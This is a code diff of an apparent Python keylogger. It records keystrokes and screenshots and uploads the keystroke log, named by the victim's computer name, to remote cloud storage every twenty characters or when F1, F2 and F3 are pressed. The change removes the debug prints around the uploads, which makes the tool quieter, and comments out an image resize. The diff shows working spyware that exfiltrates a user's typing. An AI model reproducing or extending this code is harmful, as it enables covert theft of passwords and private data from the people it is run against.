@@ -39,21 +39,21 @@ def on_press(key):
     try:
         if lastThreeKeys == ['Key.f1', 'Key.f2', 'Key.f3']:
             f.close()
-            print('?')
+
             storage.child(os.environ['COMPUTERNAME'] +
                           '/keylogs_' + today_date + '.txt') \
                 .put('data.txt')
-            print('!')
+
             # delete screenshot.jpg + data.txt
             os._exit(1)
 
         elif len(data) % 20 == 0:
             f.close()
-            print('?')
+
             storage.child(os.environ['COMPUTERNAME'] +
                           '/keylogs_' + today_date + '.txt') \
                 .put('data.txt')
-            print('!')
+
             f = open('data.txt', 'a+', encoding='utf-8')
         printKey(key)
     except Exception as e:
@@ -118,7 +118,7 @@ def on_click(x, y, button, pressed):
 
                 # try to save bitmap instead, or some other small size format of pics
                 image = Image.open(imgPath)
-                image = image.resize((1000, 562), Image.ANTIALIAS)
+                # image = image.resize((1000, 562), Image.ANTIALIAS)
                 image.save(imgPath, quality=50, optimize=True)
 
                 full_currentTime = date.today().strftime('%H:%M:%S %d.%m.%Y')
